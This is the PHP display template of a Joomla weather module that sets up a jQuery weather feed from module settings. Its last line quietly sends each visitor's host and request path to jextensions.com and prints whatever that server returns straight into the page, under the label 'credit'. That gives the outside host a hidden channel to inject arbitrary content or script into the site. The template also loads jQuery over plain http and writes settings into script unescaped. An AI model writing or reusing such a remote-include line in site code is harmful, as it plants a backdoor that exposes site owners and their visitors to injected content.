<?php
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$nanobase = JURI::base();
if(substr($nanobase, -1)=="/") { $nanobase = substr($nanobase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_weather';
$jQuery = $params->get("jQuery");

$textColor = $params->get("textColor");
$oddColor = $params->get("oddColor");
$evenColor = $params->get("evenColor");

$woeid = $params->get("woeid");
$cityCode = $params->get("cityCode");
$unit = $params->get("unit");
$image = $params->get("image");
$country = $params->get("country");
$highlow = $params->get("highlow");
$wind = $params->get("wind");
$humidity = $params->get("humidity");
$visibility = $params->get("visibility");
$sunrise = $params->get("sunrise");
$sunset = $params->get("sunset");
$forecast = $params->get("forecast");
$forecastlink = $params->get("forecastlink");		
?>
<style>
#jeYW<?php echo $module->id ?> { color:<?php echo $textColor; ?>}
#jeYW<?php echo $module->id ?>.weatherFeed {}
#jeYW<?php echo $module->id ?>.weatherFeed a { color: <?php echo $textColor; ?>; }
#jeYW<?php echo $module->id ?>.weatherFeed a:hover {color: #000;text-decoration: none;}
#jeYW<?php echo $module->id ?> .weatherItem {padding: 0.8em;text-align: right;}
#jeYW<?php echo $module->id ?> .weatherCity { text-transform: uppercase; }
#jeYW<?php echo $module->id ?> .weatherTemp {font-size: 2.8em;	font-weight: bold; text-transform:uppercase}
#jeYW<?php echo $module->id ?> .weatherDesc, .weatherCity, .weatherForecastDay  { font-weight: bold; }
#jeYW<?php echo $module->id ?> .weatherDesc { margin-bottom: 0.4em; }
#jeYW<?php echo $module->id ?> .weatherRange, .weatherWind, .weatherLink, .weatherForecastItem {}
#jeYW<?php echo $module->id ?> .weatherLink, .weatherForecastItem {margin-top: 0.5em;text-align: left;}
#jeYW<?php echo $module->id ?> .weatherForecastItem {padding: 0.5em 0.5em 0.5em 80px;background-position: left center;}
#jeYW<?php echo $module->id ?> .weatherForecastDay {}
#jeYW<?php echo $module->id ?> .odd { background-color:<?php echo $oddColor; ?>; }
#jeYW<?php echo $module->id ?> .even { background-color: <?php echo $evenColor; ?>; }
</style>
<?php if ($jQuery == '1' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.zweatherfeed.js"></script>  
<noscript><a href="http://jextensions.com/joomla-weather-module" alt="Free Joomla Extensions">Joomla Wather Module</a></noscript>

<?php
$cityCode = str_replace(" ", "", $cityCode);
$cityCode = explode(",",$cityCode);
$i = count($cityCode);?>

<script type="text/javascript">
jQuery(document).ready(function () {
	jQuery('#jeYW<?php echo $module->id ?>').weatherfeed([<?php echo "'".$cityCode[0]."'"; for ($i=1; $i<count($cityCode); $i++){echo ",'".$cityCode[$i]."'";}?>],{
			unit: '<?php echo $unit ?>',
			image: <?php echo $image ?>,
			country: <?php echo $country ?>,
			highlow: <?php echo $highlow ?>,
			wind: <?php echo $wind ?>,
			humidity: <?php echo $humidity ?>,
			visibility: <?php echo $visibility ?>,
			sunrise: <?php echo $sunrise ?>,
			sunset: <?php echo $sunset ?>,
			forecast: <?php echo $forecast ?>,
			link: <?php echo $forecastlink ?>,
			showerror: true,
			linktarget: '_blank',
			woeid: <?php echo $woeid ?>
	});
});
</script>
<div id="jeYW<?php echo $module->id ?>"></div>         
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
